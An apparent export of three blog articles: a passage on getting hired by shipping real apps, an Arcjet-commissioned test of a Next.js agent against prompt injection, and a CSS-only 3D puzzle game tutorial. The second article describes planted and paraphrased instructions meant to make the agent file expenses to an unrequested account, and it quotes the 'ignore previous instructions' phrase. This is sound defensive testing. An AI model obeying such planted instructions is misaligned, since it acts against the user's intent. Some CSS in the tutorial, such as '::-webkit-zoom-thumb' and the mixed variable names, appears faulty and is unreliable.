The rule: tutorials teach you to follow. The job is to decide. You can finish a hundred tutorials and still have never once made a real decision — what to build, what to cut, what to do when the thing just breaks and there's no "next lesson" button.

Everything in a course is scoped so you can't fail. The requirements are fixed, the answer exists, and the happy path is paved. None of that is true on the job. The job is ambiguous requirements, a half-working API, and a user doing something you never imagined. I had spent six weeks practicing a game that nobody actually hires for.

So I quit the tutorials and made a rule: I only build things a stranger could use.

The portfolio that got me hired (and the one that didn't)

My first "portfolio" was three repos: the todo app, a weather dashboard, and a half-finished clone of a site everyone clones. Standard. Dead on arrival. No recruiter has ever once opened a weather app clone and felt anything.

The portfolio that got me interviews was three completely different things:

  1. A small booking tool for my cousin's salon — real bookings, real customers, real "it broke on Saturday and I had to fix it before they opened."
  2. An inventory tracker for a local shop that was running on a paper notebook.
  3. A tiny invoicing app I built for myself and then three freelancers started using.

None of them are impressive as code. What made them work in interviews is that every one of them had a user who was not me, and a story about something going wrong in production and me fixing it.

The rule: nobody hiring a junior asks what you've learned. They ask what you've shipped that a stranger actually used. One of those is checkable. The other is a vibe.

The first time I said "a real customer double-booked because of a race condition in my code and here's how I found it and fixed it," I watched the interviewer's posture change. That sentence did more than my entire "skills" list. It's the difference between I studied this and this happened to me.

How I shipped real apps without a team (the uncomfortable part)

Here's the part some people won't like, and I'd rather say it straight than hide it: I could not have shipped three real, running apps in six months by hand-writing every line while also learning the fundamentals. There aren't enough hours.

What let me move at that pace was treating "building the app" and "understanding the app" as two separate jobs. I'd get a working, deployed version standing up fast — real database, real users, real URL — and then I'd go read it, break it, and rebuild the parts I didn't understand. Shipping first, understanding second, is backwards from how courses teach it, and it's the only order that kept me motivated, because a thing that's live is a thing you can't lie to yourself about.

The rule: a deployed app with one real user teaches you more in a week than a tutorial does in a month — because the user does the thing you swore nobody would do, and now it's your problem, not the instructor's.

The point was never "don't learn the fundamentals." I learned more fundamentals debugging a live booking race than I ever did in a course. The point is the live app was the curriculum, and it set its own syllabus in the exact order I needed it.

The six months, honestly (the shape, not fake precision)

I won't hand you a fake day-by-day plan, because mine wasn't clean and yours won't be either. The shape is the lesson:

  • Weeks 1–6: tutorials and LeetCode. Felt productive. Was not. This is the part I'd delete if I could.
  • Weeks 7–14: first real app (the booking tool). Shipped it ugly, broke it constantly, fixed it in public. Learned more here than everywhere else combined.
  • Weeks 15–20: two more real apps, each faster than the last, each with a real user I could point an interviewer at.
  • Weeks 21–26: applied. Got rejected plenty. But every callback traced back to the same thing — a real app with a real user and a real war story, not a certificate.

I counted later: the interviews I got came almost entirely from the three real apps. The tutorials, the streak, the certificates I'd half-collected — not one of them ever came up in a room where someone decided whether to hire me.

The rule: a portfolio of three real apps with real users beats a shelf of certificates in the room where they actually decide. The certificate says you attended. The shipped app says you can finish.

If you're where I was six months ago

You don't need my exact path. You need to stop doing the thing that only feels like progress and start doing the thing that's checkable:

  • Pick something one real person actually needs. Not a clone. Your aunt's bookings, your own invoices, your team's spreadsheet that should be an app. The smaller and more real, the better.
  • Ship it before it's good. A live URL with one user beats a perfect repo with none. Deploy embarrassingly early.
  • Then go understand what you shipped. Break it on purpose. Read your own code like a stranger wrote it. That's where the fundamentals finally stick.
  • Keep the war stories. Every "it broke and I fixed it" is a sentence that will out-perform your entire skills list in an interview.

The degree gets you past some filters. I won't pretend otherwise. But the thing that gets you hired — the thing in the room when a human decides — is evidence that you can take something ambiguous and make it real and keep it running when it breaks.

The rule: the fastest way to look like a senior while you're still a junior is to have already shipped something that survived contact with a real user. You can't fake that, and you don't need a degree to have it.

articles.title: Your Auth Check Passed. The Agent Still Did Something Nobody Asked For
articles.description: Authentication answers who. Authorization answers what they're allowed to do. Neither one answers...
articles.body_html:
Authentication answers who. Authorization answers what they're allowed to do. Neither one answers whether this specific action was actually intended.

That's the gap I wanted to test. I built a small AI agent and tested it against several failure cases before I got to a result I was confident in. I'm including that part too, because pretending everything worked on the first try would be its own kind of false claim.

Disclosure: Arcjet commissioned this article. I chose the angle, wrote the code, and ran the tests independently. Arcjet reviewed the technical outline for factual accuracy, not the conclusions.

The authorization gap in AI agents

Earlier in this series I made the case that a Server Action isn't a function call, it's a public POST endpoint wearing a convenient syntax. That post was about who can reach the action and whether they're allowed to. This one is about a question a model changes entirely. Once a model is deciding whether to call that action, being "allowed to" stops being the whole story.

A human clicking a button is one kind of signal. A model generating a tool call from the contents of a document is a different kind of signal, and none of the checks from that earlier post, not the ownership check, not the role check, not the proxy in front of it, were built to tell the two apart. That's not a flaw in that post's argument. It's a different question the three-layer model was never asked to answer.

The setup

I built a small Next.js research assistant. It reads a document, summarizes it, and if the document mentions filing an expense, it calls a fileExpenseReport tool to do it. Nothing fancier than that on purpose. I wanted the security behavior easy to reason about, not buried under unrelated complexity.

The stack: Vercel AI SDK, Gemini as the model, Arcjet's Guard SDK wired in at two separate points:

import { launchArcjet, detectPromptInjection } from "@arcjet/guard";
import { guardTool } from "@arcjet/guard/vercel-ai/v7";

detectPromptInjection screens the inbound document before the model ever sees it. guardTool wraps the actual tool call. They're two separate enforcement points answering two different questions, not one check doing double duty. Collapsing them into a single check is the mistake this whole piece is about, so I kept them apart on purpose.

Everything below is real output from my own account. Synthetic accounts, synthetic data, real Arcjet decisions. The "database" is a stub that logs each insert to the console, so a "database write" here means a call to that stub.

The legitimate baseline

First run: a normal document, a normal expense, nothing adversarial. The model read it, called the tool, and the database write went through. That's the control case, the thing that has to keep working while everything else gets locked down.

Attack one: the obvious injection

Next, I planted a document with a direct embedded instruction, something that told the agent to file an expense to an account nobody had actually asked about. detectPromptInjection caught it and denied the request before the model ever got a turn. The Arcjet dashboard showed the same event independently, marked PROMPT_INJECTION, sitting among otherwise clean entries.

One thing from an earlier, less finished run of the same fixture: the injection got past detection once, and the model declined to act on its own. I'm not counting that as a security control. A model refusing to do something today doesn't mean it refuses tomorrow, and treating good judgment from an LLM as your actual security boundary is exactly the mistake I built this whole test to avoid making.

A planted document is the version I actually built and tested, but it's one instance of a broader category. The same gap opens whenever the content driving a decision comes from somewhere the user didn't type it themselves, an email thread the agent summarizes, a page it scrapes, the output of a previous tool call feeding into the next one. I only have real results for the document case. I'm not going to claim I tested the others.

Attack two: the one that actually mattered

The obvious injection is the easy case. The interesting one is the paraphrased version, no "ignore previous instructions," no imperative override, just the same underlying request phrased like an ordinary business note.

detectPromptInjection let it through. The model attempted the tool call. And the action boundary, a plain allow-list check inside the tool's own execute() handler, rejected the account and left no database write behind.

That contrast is the center of the piece. Detection and authorization answer different questions. A detector asks: does this content look suspicious? The tool boundary has to ask something else entirely: should this specific call, with these specific arguments, actually run right now? A clean detection result doesn't answer that second question, and building your security around the assumption that it does is how paraphrased attacks get through.

Authorize the AI tool call before the side effect

The check that stopped this particular attack is deliberately boring: a plain application-level allow-list inside the tool's own execute() function. Worth being precise here since it's easy to conflate the two: guardTool is the Arcjet wrapper around the tool call, and the allow-list below is my own application logic. It only runs once a call has already gotten past guardTool, sitting immediately before the database write as its own separate, deterministic check.

if (!ALLOWED_ACCOUNTS.includes(input.accountId)) {
  return {
    denied: true,
    boundary: "action",
    reason: "account_not_allowed",
    message: `Account ${input.accountId} is not on the allow-list`,
  };
}

I return a structured result instead of throwing. The function exits before the database write, and the result gives the model a clear explanation for the denial. If the model retries, the same allow-list check runs again.

No exotic API, no clever abstraction. That's the point. The check doesn't need to be sophisticated. It needs to sit in the right place: after detection, after the model's decision, immediately before the side effect.

A tool call is a proposal from the model. A successful side effect is a decision made by the application. Those are not the same event, and treating them as the same event is exactly how a clean-looking request turns into an unauthorized database write.

Re-running the full matrix

I confirmed the pattern held across the rest of the set: a benign document with imperative-sounding language that shouldn't trigger a false positive, and it didn't, no tool call attempted at all. A clean document with an ambiguous instruction, no injection pattern present anywhere, still denied at the action boundary. That last one matters on its own, it proves detection alone wouldn't have caught it, because there was nothing for a detector to catch.

Why the usual layers don't close this gap

None of this replaces a proxy, a WAF, or RBAC. It's not a substitute for any of them. But it's worth being precise about what each one actually answers. A proxy or WAF sees a clean, authenticated POST request. RBAC correctly returns yes, this user is allowed to file expenses. Neither has any visibility into whether this particular call, with these particular arguments, was something the user actually intended. They're solving a different problem, and they solve it well. They just don't solve this one.

The remote-policy detour

I also tested Arcjet's remote policies, which Arcjet documents as a way to change enforcement logic centrally without redeploying the application.

The first runtime attempt didn't work cleanly. A config mismatch on my end needed fixing before the policy behaved as intended.

With that corrected, and the local allow-list temporarily expanded so it couldn't be the thing making the decision, the same running application produced two results:

Allowed account, policy in Live mode: the model called the tool with the account the policy explicitly permits, Arcjet returned ALLOW, and the database write happened.

Denied account, same code, same deployment: the model called the tool with a different account, and the response came back DENY, reason INPUT_CONSTRAINT, no error, no fallback behavior, a genuine policy match. Nothing wrote to the database.

That's what I wanted to verify with the remote policy: the decision about which accounts are allowed lived in Arcjet, not in my application code. The same running server, with no code changes, allowed one account and denied the other based on a policy I manage centrally. Per Arcjet's docs, editing that policy changes enforcement without a redeploy, though the SDK caches policies and rechecks them every few minutes, so changes are not instantaneous. I didn't test a policy edit between runs.

Tool call is not the same thing as executed

This is worth stating on its own, because it's the core claim the whole article rests on. When you check whether a tool call happened, you're checking whether the model attempted something. That's not the same as checking whether the underlying action executed. A denied call can still show up as a tool call in your logs. In my test, it never reached the database write. The same distinction matters for whatever consequential operation your tool actually performs, whether that's a database write, an external API call, an email, or a payment. If your logging conflates those two things, you can end up believing a security check is working when it's actually just recording attempts, not outcomes.

If a denied call still shows up in your logs, it's worth deciding upfront what you actually want recorded at that point:

{
  toolCall: "fileExpenseReport",
  decision: "DENY",
  boundary: "action",
  reason: "account_not_allowed",
}

Structuring it this way means an attempted-and-blocked call is unambiguous in your own telemetry, not something you have to reconstruct later by cross-referencing tool-call logs against database writes.

PII is a different boundary

Prompt-injection detection and authorization don't solve the same problem as sensitive data leaking to a model or a downstream tool call. If a document contains an email address, a phone number, or a government ID, checking the model's response is already too late, the data has already crossed the provider boundary.

I didn't run a real test of this as part of this project's matrix, so I'm not presenting one as an experiment result. But it's worth naming precisely rather than skipping past it, because the boundary is different from everywhere else in this piece. It's not right before a side effect, it's wherever sensitive data is about to leave the application's control at all, a document going to the model provider, a tool output feeding back into model context, a value about to appear in a log.

Arcjet's Guard SDK also provides local sensitive-info detection for agent and tool paths, so detection can happen in-process before sensitive content crosses another boundary. Detection tells you something sensitive is present. Redaction lets the model continue without the original value. Blocking is the right call when the value should never leave the application at all.

Automated traffic is a separate concern

One more boundary worth mentioning, because it answers a genuinely different question than everything above. I sent a real curl request to a small API route using the same Arcjet HTTP-boundary client, then sent the same request with its User-Agent changed to look like a normal browser. Both were denied as bots. Changing only the User-Agent didn't change the result. I can't say precisely which signals contributed to that decision, so I'm not going to guess at the mechanism.

I'm keeping this separate because it's a different question. An authenticated, authorized, perfectly legitimate-looking request can still be automated and abusive at volume. Request-level bot detection and rate limiting belong at the HTTP boundary, alongside the application-level checks, not instead of them.

Where this pattern doesn't help

A legitimately authorized user asking for something genuinely bad isn't caught by any of this. That's not a prompt-injection problem, it's a business-authorization problem, and it's still squarely your application's responsibility to define who's allowed to do what.

And the model's own judgment is not something to lean on as a security control, however good it looks in a given run. I saw a model decline to act on a bad instruction in one run and comply with an equivalent instruction it hadn't seen worded that way in another. That's exactly why the check needs to live in code that runs the same way every time, not in whatever the model happens to decide.

Runtime enforcement isn't free either. Each additional check adds processing and operational complexity, and remote policy evaluation introduces another dependency that needs explicit failure handling. The right tradeoff depends on how consequential the operation is and how much latency the application can tolerate.

What the experiments actually proved

Test Result
Legitimate request Tool called, database write succeeded
Obvious injection Denied by detection, corroborated in the dashboard
Paraphrased injection Passed detection, denied at the action boundary
Benign content, imperative language No tool call attempted
Clean content, ambiguous instruction Denied at the action boundary, with no injection pattern present
Remote policy, allowed account Evaluated, allowed, wrote to the database
Remote policy, denied account Evaluated and denied by the remote policy, with no database write
Real automated request Denied as a bot; changing the User-Agent did not change the result

A practical pattern

If you're building anything where a model can trigger a consequential action, put an explicit, application-level check immediately before that action for anything in this category:

  • money movement
  • deleting data
  • changing permissions
  • sending external communications
  • refunds
  • production changes

Authentication and authorization should still happen upstream, same as always. This check isn't a replacement for either. It's a specific, narrow boundary sitting right in front of the operation that actually causes harm if it's wrong.

Before an AI agent can cause a side effect

  • Is the user authenticated?
  • Is the user authorized for this resource?
  • Is content influencing the model treated as untrusted?
  • Is the tool call independently authorized?
  • Are the actual tool arguments checked, not just the fact that a call happened?
  • Does denial happen before the side effect?
  • Can sensitive data leave the application?
  • Can automated traffic reach the endpoint repeatedly?
  • Have you verified that a denied call produces no side effect, not just a log entry?

The model doesn't own the security boundary

Authentication tells you who's asking. Authorization tells you what they're generally allowed to do. Neither one tells you that this specific action, generated by a model, from content it read somewhere, was actually something anyone intended. That check belongs at the action itself, checked in code that behaves the same way on every run, not inferred from whether the request looked clean upstream or whether the model seemed to behave reasonably this time.

Put the boundary where the side effect happens. Everything else is a proposal until then.

articles.title: CSS only game: Point and click puzzle cube
articles.description: Introduction   Recently I wanted to experiment more with 3D objects in CSS. So, I started...
articles.body_html:
Introduction

Recently I wanted to experiment more with 3D objects in CSS. So, I started with setting up a “simple” 3D object in CSS: a cube.
After fiddling around I managed to create said cube, and proceeded to stack 3 on top of them to create a 3D rotating snowman: https://codepen.io/jvp/pen/XJrPXjx
This gave me the idea to take it a step further: how far CSS could go in building not just a 3D object, but an actual interactive game?

Starting from a simple cube, I ended up building a layered point-and-click puzzle box powered entirely by CSS: state management, animations, and even puzzle progression logic.

In this article, I’ll walk through the key techniques that make this work:

  • building a 3D cube
  • reading input values in CSS
  • and sequencing game logic without JavaScript

If you want to see the full code and/or go straight to the result you can view the game at https://codepen.io/jvp/full/RNPbPNw. I will not explain every line of code in this article but instead will pick the parts that are worth explaining how the entire thing works and behaves.

Disclaimer
Currently, this CSS-only game only works in Chrome because it uses style container queries which are not yet supported in other browsers.
If you open the game in another browser, you will see a dialog that will provide a link to an older version of the game where range sliders have an oninput change listener to set the input's value to a data-value property with JavaScript.

Setting up a cube in CSS

To create a CSS cube we need to set our HTML with a container element and 6 faces of the cube:

<div class="cube-container">
  <div class="cube-face front"></div>
  <div class="cube-face back"></div>
  <div class="cube-face right"></div>
  <div class="cube-face left"></div>
  <div class="cube-face top"></div>
  <div class="cube-face bottom"></div>
</div>

Then we add some CSS, first for the container:

.cube-container {
  --cube-size: 200px;
  --half-size: calc(var(--cube-size) / 2);
  width: var(--cube-size);
  height: var(--cube-size);
  margin: var(--half-size);
  transform-style: preserve-3d;
  position: relative;
  transform: rotateX(var(--rotate-x, -15deg)) rotateY(var(--rotate-y, -45deg));
}

Transform-style: preserve-3d is necessary to make the 3D perspective work.
As for transform property itself, a rotate3d value exists but I found that to be quite confusing. Instead, we are using rotateX to rotate the cube on the vertical axis (yes, this is counterintuitive) and rotateY for the horizontal axis.
Right now the --rotate-x and --rotate-y vars have default values of -15deg and -45deg, but we’ll properly set these vars later.

Next is the CSS for the faces:

.cube-face {
  position: absolute;
  width: inherit;
  height: inherit;

  &.front { transform: translateZ(var(--half-size)); }
  &.back { transform: translateZ(calc(-1 * var(--half-size))) rotateY(180deg); }
  &.right { transform: rotateY(90deg) translateZ(var(--half-size)); }
  &.left { transform: rotateY(-90deg) translateZ(var(--half-size)); }
  &.top { transform: rotateX(90deg) translateZ(var(--half-size)); }
  &.bottom { transform: rotateX(-90deg) translateZ(var(--half-size)); }
}

With this CSS applied, the cube will look something like this:

And this is where code for CSS cubes get a bit more counterintuitive, at least to my opinion. TranslateZ will move the element along the Z axis, or in other words: depth. Each face starts from the “center” of the cube.
So, for the front face we need move it forwards on the Z axis, half a cube size.
For the back face, we need to move it backwards using translateZ with a negative half-size value. But after it has been moved back, we will be looking at the backside of the element. We flip it on its horizontal axis by then applying rotateY(180deg) so that we can look at the front-side of this face.
For the right and left sides, we define rotateY first to let the face turn to the correct side and then apply the depth with translateZ to move it outwards. The same approach Is used for the top and bottom sides.

As you can see when comparing the back and the right/left style definitions, determining the order of your transformations has an impact on how the 3d aspect is applied and it can become hard to visualize the outcome of your styling beforehand. The best approach is to just try out stuff in your browser’s devtools, so you get instant feedback of your changes.

At this point, we have made a 3D cube out of CSS and HTML that still has a static rotation value.
In the next step we will apply controls for our game so that we can rotate and zoom our cube using sliders.

Adding range sliders as game controls — and reading their values in CSS.

In this game there are multiple range sliders that control the game in different ways. For example, for zoom and for rotating the cube horizontally/vertically. But there are also range sliders for individual puzzles.
Usually, you can’t read the values of range sliders in CSS, you’d need JS for that. But by applying a combination of cool CSS features we can actually use the values of the sliders in CSS.

In a nutshell: we will leverage view-timeline on range sliders to keep track of the range slider thumb’s position, then update a CSS var using a keyframe animation based on that position, then can use that CSS var in/on other elements.

We’ll look at a range slider which is the easiest to explain so that we can understand how the technique works.
The zoom slider allows us to zoom in/out a bit on the cube:

<div class="slider-container zoom-slider">
  <div class="thumb-track">
    <input type="range" min="0" max="5" value="2" class="slider">
  </div>
</div>

The HTML part is straightforward: a range slider with a min, max and value attribute. Its parent is a div with class “thumb-track” which we’ll get into later.

The CSS part contains a lot more stuff to go over, so we’ll dissect that step by step:

@property --zoom-value {
  syntax: "<integer>";
  inherits: true;
  initial-value: 2;
}

input[type="range"] {
  overflow: hidden;
  animation: --zoom-anim linear both;
  animation-timeline: --zoom-timeline;
  animation-range: entry 100% exit 0%;
  timeline-scope: --zoom-timeline;
}

input[type="range"]::-webkit-zoom-thumb {
  view-timeline: --zoom-timeline inline;
}

@keyframes --zoom-anim {
  from { --zoom-val: 5 }
  to { --zoom-val:  0 }
}
  1. --zoom-value registration using @property.
    • By using @property to register the CSS var as an integer, we tell the browser how to interpolate its value.
    • Without this, the browser will handle the var as a string, making it impossible to use the var's value in animations.
  2. view-timeline: --zoom-timeline
    • Defined on the webkit-zoom-thumb pseudo selector, turns the thumb's position within a scroll container into a named progress timeline.
    • As we move the thumb to the right using our mouse, the thumb "scrolls" and we can track its progress as it goes from 0% to 100%.
    • inline means that we work on the x/horizontal axis. block would mean that we would work on a y/vertical axis.
  3. overflow: hidden
    • Will make sure that the "viewport" of the scroll container is bound to the input's size.
  4. animation-timeline: --zoom-timeline
    • Means that the animation is driven by the timeline/scroll position, instead of regular keyframe animations that are based on seconds.
  5. timeline-scope: --zoom-timeline
    • By default, a view-timeline is only usable by the children of the element that defined the timeline (in our case the thumb).
    • By defining timeline-scope on the input, it can grab the --zoom-timeline from the thumb and apply it on itself (the input) instead.
  6. animation-fill-mode: both
    • Timeline-driven animations only apply their keyframe values (on --zoom-value) while the element is within the animation-range. Outside that range (at start or end), the --zoom-value property resets back to its initial value.
    • By applying the value both, we make sure that the property's value holds at either the start or end values when at the edges of the range.
  7. animation-range: entry 100% exit 0
    • This feels wrong, but by default, scroll/view-timelines are designed for elements entering the viewport from the bottom and move to the top, or from right to left.
    • "0%" is the moment the element starts to enter the view, and "100%" is when it exits/leaves.
    • Since our slider thumb starts on the left (the "entry" side), we map the start of the animation to entry 100% so that moving right (towards the "exit") progresses the value forward.
    • This flips the timeline logic to compensate for the earlier mentioned default direction of the view timeline.
  8. animation: --zoom-anim
    • This keyframe animation follows the same logic as the "inverted" animation-range.
    • At the end (from) of the timeline animation, update --zoom-value to be 5.
    • At the start (to) of the timeline animation, update --zoom-value to be 0.
    • Any timeline progress (when you drag the thumb) between end and start will be interpolated to values like 1, 2, 3 or 4.

That’s a lot of information, but it takes some time to explain it and to wrap your head around this solution.
But, now that we can update our CSS var, it’s time to use it!

.container .game-holder {
  scale: calc(0.8 + var(--zoom-val) * 0.18);
}

body {
  --rotate-x: calc((var(--ver-val) - 90) * 1deg);
  --rotate-y: calc(var(--hor-val) * 1deg);
}

Based on the zoom slider’s value, the scaling of our cube will be somewhere between 0.8 and 1.8.
On the body, we define the --rotate-y and --rotate-x CSS vars (for the horizontal and vertical sliders) based on the --ver-val and --hor-val custom properties that were created in a similar manner like --zoom-val.
In the previous chapter we already used these rotate vars on the .cube-container for rotation, so now that we added the sliders, we can scale and rotate our cube in real time!

At this point, we have implemented a technique based on view-timeline to read and store the value of input range sliders without any JavaScript.
This isn’t just used for rotation and zooming of the cube, it’s also used as a game mechanic in a few puzzles.

Adding visuals, a puzzle element, an inventory and a dialog

With the basics in place, we can start adding textures to our cube and incorporate puzzle elements to it.
For this game I decided to build multiple layers of the cube. So, there’s an outer / 1st layer where we start and once that layer is solved, we go deeper into the cube to the 2nd layer and finally into the 3rd layer.
For the aesthetics, I decided to go with a copper steampunk style. Given the fact that we’re dealing with a puzzle cube, steampunk gears would also fit perfectly. I made use of Bing’s free AI image generator and asked it to generate 6 faces of a cube in this aesthetic and named 6 different animal faces that should be on each face of the cube. The result was a beautiful image with a great steampunk aesthetic; we’re off to a great start!

As one could expect with AI though (it’s never perfect), there were 2 bears in it, and the wolf and fox looked a bit similar. I decided to put the bear and wolf faces at the top and bottom of the cube so they were less prominent.
The bear with the goggles gave a great opportunity to put a red gemstone in one of the goggles that the player could inspect and collect. Putting the bear with the goggles on the back of the cube meant that it would only become visible once the player rotates the cube. This way the player is taught to look around the cube for clues to solve puzzles.
I mapped each face from the image to each face of the cube, gave the cube an extra layer-1 class and added a inside the right face for the gem, which, based on the starting point of view (POV) for the game, was at the back of the cube.

<div class="cube-container cube-layer-1">
  ...
  <div class="cube-face right">
    <label for="gem-red-dialog" class="gem-red-get gem-label"></label>
  </div>
  ...
</div>

At the start of the HTML, I added a checkbox with id gem-red-dialog, to which the aforementioned label points to with it’s for attribute.

<input type="checkbox" id="gem-red-dialog" />

After clicking the label, the input for the dialog will become checked. Using the label + checkbox combination is one way of doing state management without JS, and it’s probably the most robust one as it will result in a clear boolean value after clicking on the label.

Now that the red gem is clickable, we will hook into it and do two things:

  • Display a dialog describing the item that was picked up.
  • Add some UI for an inventory so we can display the collected red gem.

The dialog element is a simple div container that’s hidden by default and has disabled pointer events.

<div class="dialog gem-red">
  <div class="item gem-red"></div>
  <h1>Garnet</h1>
  <p>An expensive looking gemstone.</p>
  <p>Looks like it could fit into something.</p>
  <label for="gem-red-get" class="close"></label>
</div>

Once the checkbox is checked, it animates in:

.dialog {
  ...
  opacity: 0;
  pointer-events: none;
}

#gem-red-dialog:checked ~ .dialog.gem-red {
  pointer-events: all;
